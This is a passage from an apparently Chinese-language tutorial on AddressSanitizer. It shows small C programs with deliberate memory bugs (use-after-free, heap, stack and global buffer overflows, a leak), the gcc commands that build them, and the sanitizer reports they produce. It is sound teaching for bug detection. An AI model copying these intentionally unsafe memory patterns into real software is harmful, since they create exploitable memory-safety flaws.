class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br></pre></td></tr></table></figure><ul><li>第一部分（ERROR）指出错误类型是heap-use-after-free；</li><li>第二部分（READ）, 指出线程名thread T0，操作为READ，发生的位置是use-after-free.c:14。</li><li>第三部分 (SUMMARY) 前面输出的概要说明。</li></ul><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><h3 id="fsanitize-address"><a href="#fsanitize-address" class="headerlink" title="-fsanitize=address"></a>-fsanitize=address</h3><p>用户态内存错误检测，可以被环境变量ASAN_OPTIONS控制具体行为。</p><p><strong>use after free</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(value);</span><br><span class="line">  <span class="keyword">return</span> *value;  <span class="comment">// use after free. BOOM!!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译链接</p><p><code>gcc -g -o use_after_free -fsanitize=address -lasan -fuse-ld=gold use_after_free.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./use_after_free</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//访问释放后的内存</span></span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:        <span class="comment">//内存在哪里释放</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:         <span class="comment">//内存在哪里申请</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fd]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4897</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>heap-buffer-overflow</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> a= <span class="number">100</span>;</span><br><span class="line">  *((<span class="keyword">int</span>*)value) = a;  <span class="comment">// heap buffer overflow.  BOOM</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> *value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o heap_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold heap_buffer_overflow.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./heap_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4969</span>==ERROR: AddressSanitizer: heap-buffer-overflow <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x000000400971</span> bp <span class="number">0x7ffc34e7a150</span> sp <span class="number">0x7ffc34e7a140</span></span><br><span class="line">WRITE of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//这里内存越界</span></span><br><span class="line">    <span class="meta">#0 0x400970 in main /home/c7/桌面/asan/heap_buffer_overflow.c:13</span></span><br><span class="line">    <span class="meta">#1 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400828 in _start (/home/c7/桌面/asan/heap_buffer_overflow+0x400828)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff1</span> <span class="keyword">is</span> located <span class="number">0</span> bytes to the right of <span class="number">1</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff1</span>)</span><br><span class="line">allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7f8174db3602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40090e in main /home/c7/桌面/asan/heap_buffer_overflow.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/c7/桌面/asan/heap_buffer_overflow.c:<span class="number">13</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[<span class="number">01</span>]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4969</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>memory leak</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  p = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  p = <span class="number">0</span>; <span class="comment">// The memory is leaked here.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./memory_leak</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5014</span>==ERROR: LeakSanitizer: detected memory leaks</span><br><span class="line"></span><br><span class="line">Direct leak of <span class="number">7</span> <span class="built_in">byte</span>(s) <span class="keyword">in</span> <span class="number">1</span> <span class="built_in">object</span>(s) allocated <span class="keyword">from</span>:</span><br><span class="line">    <span class="meta">#0 0x7f3e3f381602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x400703 in main /home/c7/桌面/asan/memory_leak.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f3e3ef3f83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="number">7</span> <span class="built_in">byte</span>(s) leaked <span class="keyword">in</span> <span class="number">1</span> allocation(s).</span><br></pre></td></tr></table></figure><h3 id="Stack-buffer-overflow"><a href="#Stack-buffer-overflow" class="headerlink" title="Stack-buffer-overflow"></a>Stack-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> stack_array[<span class="number">100</span>];</span><br><span class="line">  stack_array[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> stack_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./stack_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5077</span>==ERROR: AddressSanitizer: stack-buffer-overflow <span class="keyword">on</span> address <span class="number">0x7ffe67846ad4</span> at pc <span class="number">0x000000400916</span> bp <span class="number">0x7ffe67846900</span> sp <span class="number">0x7ffe678468f0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x7ffe67846ad4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x400915 in main /home/c7/桌面/asan/stack_overflow.c:4</span></span><br><span class="line">    <span class="meta">#1 0x7fd65942183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400758 in _start (/home/c7/桌面/asan/stack_overflow+0x400758)</span></span><br><span class="line"></span><br><span class="line">Address <span class="number">0x7ffe67846ad4</span> <span class="keyword">is</span> located <span class="keyword">in</span> stack of thread T0 at offset <span class="number">436</span> <span class="keyword">in</span> frame</span><br><span class="line">    <span class="meta">#0 0x400835 in main /home/c7/桌面/asan/stack_overflow.c:1</span></span><br><span class="line"></span><br><span class="line">  This frame has <span class="number">1</span> <span class="built_in">object</span>(s):</span><br><span class="line">    [<span class="meta">32, 432) &#x27;stack_array&#x27; &lt;== Memory access at offset 436 overflows this variable</span></span><br><span class="line"><span class="meta">HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext</span></span><br><span class="line"><span class="meta">      (longjmp and C++ exceptions *are* supported)</span></span><br><span class="line"><span class="meta">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/c7/桌面/asan/stack_overflow.c:4 main</span></span><br><span class="line"><span class="meta">Shadow bytes around the buggy address:</span></span><br><span class="line"><span class="meta">  0x10004cf00d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d20: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">=&gt;0x10004cf00d50: 00 00 00 00 00 00 00 00 00 00[f4</span>]f4 f3 f3 f3 f3</span><br><span class="line">  <span class="number">0x10004cf00d60</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d70</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d80</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d90</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00da0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5077</span>==ABORTING</span><br></pre></td></tr></table></figure><h3 id="Global-buffer-overflow"><a href="#Global-buffer-overflow" class="headerlink" title="Global-buffer-overflow"></a>Global-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_array[<span class="number">100</span>] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> global_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o global_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold global_overflow.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./global_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5117</span>==ERROR: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow <span class="keyword">on</span> address <span class="number">0x0000004021f4</span> at pc <span class="number">0x00000040080c</span> bp <span class="number">0x7fff85f8aaf0</span> sp <span class="number">0x7fff85f8aae0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x0000004021f4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x40080b in main /home/c7/桌面/asan/global_buffer_overflow.c:3</span></span><br><span class="line">    <span class="meta">#1 0x7fd4153e383f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x4006e8 in _start (/home/c7/桌面/asan/global_buffer_overflow+0x4006e8)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000004021f4</span> <span class="keyword">is</span> located <span class="number">4</span> bytes to the right of <span class="keyword">global</span> variable <span class="string">&#x27;global_array&#x27;</span> defined <span class="keyword">in</span> <span class="string">&#x27;global_buffer_overflow.c:1:5&#x27;</span> (<span class="number">0x402060</span>) of size <span class="number">400</span></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow /home/c7/桌面/asan/global_buffer_overflow.c:<span class="number">3</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0000800783e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0000800783f0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078400</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078410</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078420</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x000080078430</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[f9]f9</span><br><span class="line">  <span class="number">0x000080078440</span>: f9 f9 f9 f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078450</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078460</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078470</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078480</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  